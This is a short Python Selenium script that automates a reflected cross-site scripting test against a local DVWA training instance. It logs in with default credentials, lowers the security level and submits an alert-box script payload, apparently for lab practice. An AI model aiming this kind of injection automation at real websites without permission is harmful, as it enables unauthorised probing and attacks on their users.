#!/usr/bin/python
"""
Automated XSS checking system - for test in DVWA
"""

from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from bs4 import BeautifulSoup
import time
xss_code = "<script>alert(String.fromCharCode(88,83,83));</script>"

br = webdriver.Firefox()
br.set_window_position(5000,0)
br.set_window_size(600,400)

br.get('http://localhost/dvwa/login.php')
username = br.find_element_by_xpath("//input[@name='username']")
password = br.find_element_by_xpath("//input[@name='password']")
username.send_keys("admin")
password.send_keys("password")
time.sleep(2)
br.find_element_by_name("Login").click()

print "[*] Logged into DVWA: %s" %(br.title)
br.find_element_by_link_text("DVWA Security").click()

security = br.find_element_by_name("security")
security.send_keys("low")
time.sleep(2)
br.find_element_by_name("seclev_submit").click()

time.sleep(2)
br.find_element_by_link_text("XSS reflected").click()

for element in br.find_elements_by_xpath("//input"):
    type_name = element.get_attribute('type')
    if type_name == "text":
        form_elt = element
    elif type_name == "submit":
        submit_elt = element

form_elt.send_keys(xss_code)
submit_elt.click()
try:
    alert = br.switch_to_alert()
    print alert.text
except:
    print "[**] No Alert found - XSS failed"
finally:
    br.quit()


